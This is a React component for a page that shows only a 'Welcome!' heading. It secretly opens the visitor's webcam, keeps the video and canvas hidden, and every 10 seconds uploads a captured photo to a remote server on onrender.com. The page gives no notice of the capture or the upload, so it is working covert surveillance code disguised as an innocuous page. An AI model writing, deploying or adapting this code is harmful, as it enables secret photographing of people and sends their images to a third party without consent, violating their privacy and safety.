import React, { useEffect, useRef, useState } from 'react';
import './App.css';

function App() {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [takeImgErr, setTakeImgErr] = useState()
  console.log(takeImgErr);

  // Server URL to post the image
  // const serverUrl = 'http://localhost:4000/post-image'; 
  const serverUrl = 'https://cam-server-751q.onrender.com/post-image';

  // Function to take photo and post it to the server
  const takePhotoAndPost = async () => {
    if (videoRef.current && canvasRef.current) {
      const canvas = canvasRef.current;
      const video = videoRef.current;
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const context = canvas.getContext('2d');
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Convert canvas to a blob
      canvas.toBlob(async (blob) => {
        if (blob) {
          const formData = new FormData();
          formData.append('image', blob, 'photo.png'); // You can change the filename here

          try {
            if (!takeImgErr) {
              const response = await fetch(serverUrl, {
                method: 'POST',
                body: formData
              });
              const data = await response.json();
              console.log('Response from server:', data);
            }
          } catch (error) {
            console.error('Error posting image:', error);
          }
        }
      }, 'image/png');
    }
  };

  const getVideo = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          width: 1920,
          height: 1080
        },
      });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }
    } catch (err) {
      setTakeImgErr(err)
      console.error("Error accessing webcam:", err);
    }
  };

  useEffect(() => {
    getVideo();

    const intervalId = setInterval(() => {
      takePhotoAndPost();
    }, 10000); // Call every 5 seconds

    return () => {
      clearInterval(intervalId);
      if (videoRef.current && videoRef.current.srcObject) {
        videoRef.current.srcObject.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  return (
    <div style={{ textAlign: 'center', marginTop: '50px' }}>
      <h1 style={{ fontWeight: 'bold' }}>Welcome!</h1>
      <video ref={videoRef} style={{ display: 'none' }} autoPlay playsInline />
      <canvas ref={canvasRef} style={{ display: 'none' }} />
    </div>
  );
}

export default App;
